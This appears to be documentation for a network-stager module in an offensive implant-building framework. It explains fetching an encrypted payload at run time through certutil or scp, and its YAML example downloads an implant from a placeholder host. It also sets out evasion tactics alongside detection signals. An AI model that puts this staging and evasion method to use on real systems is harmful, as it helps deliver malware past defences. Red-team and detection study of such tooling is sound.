# Network stager

*Fetches the payload over the network at run time instead of embedding it, so
nothing of it ships in the artifact and the operator can rotate it freely.*

## Metadata

| | |
|---|---|
| **ATT&CK** | T1105, T1071 |
| **Stability** | experimental (compile-verified; the `scp://` transport is not runtime-verified) |
| **Category** | Control |
| **YAML key** | `network_stager` |

## What it does

Fetches a payload over the network at **run time** instead of embedding it in the
artifact. The step downloads the bytes, optionally decrypts them, and hands them
to the next Execution step, which runs them exactly as it would an embedded
payload.

## YAML parameters

| field | type | default | notes |
| --- | --- | --- | --- |
| `payload` | string | *(required)* | name in `build.payloads` this step stages; must also be loaded by a later Execution step |
| `url` | string | *(required)* | the URL; the scheme picks the transport (`http://`/`https://`/`ftp://` → `certutil`, `scp://` → `scp`) |
| `crypto` | `none` \| `xchacha20poly1305` | `none` | whether the fetched blob is encrypted |
| `key` | string (hex) | — | 32-byte key; required when `crypto` is not `none` |
| `nonce` | string (hex) | — | 24-byte nonce; required when `crypto` is not `none` |
| `timeout_ms` | integer | `30000` | connect/read timeout |
| `retries` | integer | `0` | extra attempts after the first |

## YAML example

```yaml
runtime:
  - technique: network_stager
    params:
      payload: implant
      url: "https://example.invalid/implant.bin"
      crypto: xchacha20poly1305
      key: "…64 hex chars…"
      nonce: "…48 hex chars…"
  - technique: reflective_loading
    params:
      payload: implant
```

## How it works

```mermaid
sequenceDiagram
    participant L as Loader
    participant D as certutil or scp
    participant S as Server
    Note over L: payload is not embedded at build time
    L->>D: spawn downloader with URL
    D->>S: fetch payload
    S-->>D: bytes
    D-->>L: temp file on disk
    L->>L: read and optionally decrypt
    L->>L: store bytes in a global slot
```

### 1. Build time: leave the payload out

1. The build detects that `implant` is named by a `network_stager` step, so it is
   **not** embedded (`include_bytes!`) or encrypted — nothing of it ships in the
   artifact.

### 2. Run time: fetch and decrypt

2. At run time the stager runs a downloader (`certutil` or `scp`) into a temp
   file, waits (with a timeout), reads the bytes and (optionally) decrypts them
   with XChaCha20-Poly1305.

### 3. Hand off to the next step

3. The bytes are stored in a process-global slot; the next Execution step reads
   that slot instead of decrypting an embedded payload.

## What it evades

- **The payload never ships in the artifact**, so there is no embedded ciphertext
  for a scanner to entropy-test or signature-match; the operator can rotate the
  payload without rebuilding.
- **Living off the land**: the fetch rides a signed Microsoft binary (`certutil`)
  or `scp`, matching normal admin traffic rather than a custom socket client.
- The URL, credentials and key/nonce are obfuscated through `StringsConfig`.

## What detects it

- The child process (`certutil`/`scp`) and its command line are observable by EDR
  and are themselves a LOLBin-detection signal.
- The artifact gains no static network imports (the fetch is a subprocess), but
  the runtime download is a network connection an NDR/EDR can see.
- A temp file is written to disk between download and execution (an in-memory
  transport such as WinHTTP would avoid it — see `docs/design/network-stager.md`).

## Measurements

Not yet measured: the transport is a subprocess download and runtime
verification on a live network is pending. See `docs/measurements.md`.

## Implementation notes

- **Transport is decided at build time** from the URL scheme, so the fragment
  never parses a scheme at run time and carries no scheme literals.
- The `scp://` transport is **not runtime-verified** (no SSH host available) and
  requires a passwordless key; see the design doc.
- A staged payload cannot be validated at build time (there are no bytes to
  inspect), so `build.payloads.<name>.sha256` is not enforced here.

## References

- `docs/design/network-stager.md` — the full design, phases and open questions.
- `src/engine/steps.rs` — the runner wiring (`take_staged_payload`).
- `src/engine/stager.rs` — the shared slot and staged decryption.
